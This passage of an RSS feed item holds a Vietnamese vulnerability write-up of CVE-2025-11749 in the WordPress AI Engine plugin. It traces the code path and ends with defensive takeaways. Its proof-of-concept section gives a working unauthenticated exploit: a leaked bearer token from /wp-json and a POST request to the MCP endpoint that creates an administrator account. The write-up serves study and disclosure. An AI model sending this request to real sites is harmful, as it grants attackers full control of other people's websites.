&amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function execute_tool( $tool, $args, $id ) {&#xA;    try {&#xA;      ...&#xA;      $filtered = apply_filters( &amp;#39;mwai_mcp_callback&amp;#39;, null, $tool, $args, $id, $this );&#xA;      ...&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      return $this-&amp;gt;rpc_error( $id, -32603, $e-&amp;gt;getMessage() );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;execute_tool&lt;/code&gt; gọi đến các callback đã đăng ký cho filter &lt;code&gt;mwai_mcp_callback&lt;/code&gt; cùng 3 tham số đã truyền vào trước đó.&lt;/p&gt;&#xA;&lt;p&gt;Khi search với từ khóa &lt;code&gt;mwai_mcp_callback&lt;/code&gt; ta thấy nó được đăng ký trong class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt;, nơi ảnh hưởng trực tiếp đến lỗ hổng này.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#34; title=&#34;Filter mwai_mcp_callback&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Filter mwai_mcp_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#39; alt=&#34;Filter&#34; height=&#34;422&#34; width=&#34;1740&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter mwai_mcp_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều kiện để filter này hoạt động là class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; phải được khởi tạo ở đâu đó.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#34; title=&#34;Meow_MWAI_Labs_MCP_Core được khởi tạo&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/init.png&#34; data-sub-html=&#34;&lt;h2&gt;Init&lt;/h2&gt;&lt;p&gt;Meow_MWAI_Labs_MCP_Core được khởi tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#39; alt=&#34;Init&#34; height=&#34;669&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Meow_MWAI_Labs_MCP_Core được khởi tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Điều này chỉ xảy ra khi MCP Features WordPress được bật. Ta có thể hoàn thành các thiết lập này trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#34; title=&#34;Bật MCP Features WordPress&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable1.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable1&lt;/h2&gt;&lt;p&gt;Bật MCP Features WordPress&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#39; alt=&#34;Enable1&#34; height=&#34;353&#34; width=&#34;851&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bật MCP Features WordPress&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi filter được áp dụng, callback &lt;code&gt;handle_call&lt;/code&gt; sẽ được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_call( $prev, string $tool, array $args, int $id ) {&#xA;    // Security check is already done in the MCP auth layer&#xA;    // If we reach here, the user is authorized to use MCP&#xA;    if ( !empty( $prev ) || !isset( $this-&amp;gt;tools()[ $tool ] ) ) {&#xA;      return $prev;&#xA;    }&#xA;    return $this-&amp;gt;dispatch( $tool, $args, $id );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nếu là tool hợp lệ =&amp;gt; gọi đến &lt;code&gt;dispatch( $tool, $args, $id )&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong danh sách tool hợp lệ, gồm có tool &lt;code&gt;wp_create_user&lt;/code&gt; dùng để tạo user mới =&amp;gt; Tạo được người dùng với quyền &lt;code&gt;administrator&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; title=&#34;Tool wp_create_user&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/valid_tool.png&#34; data-sub-html=&#34;&lt;h2&gt;Tool&lt;/h2&gt;&lt;p&gt;Tool wp_create_user&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/valid_tool.png&#39; alt=&#34;Tool&#34; height=&#34;411&#34; width=&#34;1098&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Tool wp_create_user&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tool này yêu cầu các thuộc tính: &lt;code&gt;user_login&lt;/code&gt;, &lt;code&gt;user_email&lt;/code&gt;, &lt;code&gt;user_pass&lt;/code&gt;, &lt;code&gt;display_name&lt;/code&gt;, &lt;code&gt;role&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Request body hiện tại sẽ như sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tiếp tục phân tích hàm &lt;code&gt;dispatch&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;private function dispatch( string $tool, array $a, int $id ): array {&#xA;    $r = [ &amp;#39;jsonrpc&amp;#39; =&amp;gt; &amp;#39;2.0&amp;#39;, &amp;#39;id&amp;#39; =&amp;gt; $id ];&#xA;    switch ( $tool ) {&#xA;    ...&#xA;      case &amp;#39;wp_create_user&amp;#39;:&#xA;        $data = [&#xA;          &amp;#39;user_login&amp;#39; =&amp;gt; sanitize_user( $a[&amp;#39;user_login&amp;#39;] ),&#xA;          &amp;#39;user_email&amp;#39; =&amp;gt; sanitize_email( $a[&amp;#39;user_email&amp;#39;] ),&#xA;          &amp;#39;user_pass&amp;#39; =&amp;gt; $a[&amp;#39;user_pass&amp;#39;] ?? wp_generate_password( 12, true ),&#xA;          &amp;#39;display_name&amp;#39; =&amp;gt; sanitize_text_field( $a[&amp;#39;display_name&amp;#39;] ?? &amp;#39;&amp;#39; ),&#xA;          &amp;#39;role&amp;#39; =&amp;gt; sanitize_key( $a[&amp;#39;role&amp;#39;] ?? get_option( &amp;#39;default_role&amp;#39;, &amp;#39;subscriber&amp;#39; ) ),&#xA;        ];&#xA;        $uid = wp_insert_user( $data );&#xA;        if ( is_wp_error( $uid ) ) {&#xA;          $r[&amp;#39;error&amp;#39;] = [ &amp;#39;code&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_code(), &amp;#39;message&amp;#39; =&amp;gt; $uid-&amp;gt;get_error_message() ];&#xA;        }&#xA;        else {&#xA;          $this-&amp;gt;add_result_text( $r, &amp;#39;User created ID &amp;#39; . $uid );&#xA;        }&#xA;        break;&#xA;    ...&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm gọi đến &lt;code&gt;wp_insert_user&lt;/code&gt; để tạo tài khoản WordPress mới với tất cả các giá trị do ta kiểm soát =&amp;gt; &lt;strong&gt;Privilege Escalation&lt;/strong&gt; xảy ra&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access /wp-json&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;REST API exposes MCP endpoints (Bearer Token leaked)&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Extract Bearer Token from response&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send POST request to /wp-json/mcp/v1/{token}/messages&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;permission_callback → handle_noauth_access()&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Bearer Token valid&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;wp_set_current_user(admin)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;handle_message()&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;method = tools/call&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;execute_tool()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;mwai_mcp_callback triggered&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;dispatch()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;wp_create_user()&amp;#34;]&#xA;&#xA;N --&amp;gt; O[&amp;#34;New administrator account created&amp;#34;]&#xA;&#xA;O --&amp;gt; P[&amp;#34;Privilege Escalation&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Truy cập endpoint &lt;code&gt;/wp-json&lt;/code&gt; để lấy giá trị &lt;strong&gt;Bearer Token&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Gửi request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/mcp/v1/{token}/messages HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;    &amp;#34;name&amp;#34;: &amp;#34;wp_create_user&amp;#34;,&#xA;    &amp;#34;arguments&amp;#34;: {&#xA;      &amp;#34;user_login&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;user_email&amp;#34;: &amp;#34;hacker@gmail.com&amp;#34;,&#xA;      &amp;#34;user_pass&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;display_name&amp;#34;: &amp;#34;hacker&amp;#34;,&#xA;      &amp;#34;role&amp;#34;: &amp;#34;administrator&amp;#34;&#xA;    }&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login với tài khoản vừa tạo&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/result.png&#39; alt=&#34;Result&#34; height=&#34;638&#34; width=&#34;1243&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng trong AI Engine (≤ 3.1.3) xuất phát từ việc &lt;strong&gt;kết hợp sai giữa cơ chế “No-Auth URL” và logic phân quyền nội bộ&lt;/strong&gt;, dẫn đến việc &lt;strong&gt;cấp quyền quản trị chỉ dựa trên một Bearer Token bị lộ công khai&lt;/strong&gt;.&#xA;Khi endpoint MCP được hiển thị trong &lt;code&gt;/wp-json&lt;/code&gt;, kẻ tấn công có thể thu thập token, gọi trực tiếp API và thực thi các hành động nhạy cảm như tạo tài khoản quản trị mới mà &lt;strong&gt;không cần xác thực&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Mặc dù quyền admin chỉ tồn tại trong vòng đời của request, nhưng chỉ cần &lt;strong&gt;một lần gọi hợp lệ&lt;/strong&gt; là đủ để tạo tài khoản quản trị vĩnh viễn, dẫn đến &lt;strong&gt;Privilege Escalation hoàn chỉnh&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá v3.1.4 chỉ ẩn endpoint khỏi REST index, giúp giảm khả năng bị dò quét, nhưng &lt;strong&gt;không giải quyết triệt để vấn đề thiết kế bảo mật cốt lõi&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không bao giờ sử dụng token trong URL như cơ chế xác thực.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Ẩn endpoint (&lt;code&gt;show_in_rest = false&lt;/code&gt;) không đồng nghĩa với bảo mật.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;&lt;code&gt;wp_set_current_user()&lt;/code&gt; không nên được dùng cho xác thực từ request bên ngoài.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Mọi API có khả năng thay đổi trạng thái hệ thống phải có xác thực mạnh (auth + authorization).&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Việc gán quyền admin trong request, dù tạm thời, vẫn đủ để gây leo thang đặc quyền.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;REST API cần được thiết kế theo nguyên tắc “deny by default”.&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/ai-engine/vulnerability/wordpress-ai-engine-plugin-3-1-3-unauthenticated-sensitive-information-exposure-to-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin &amp;lt;= 3.1.3 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
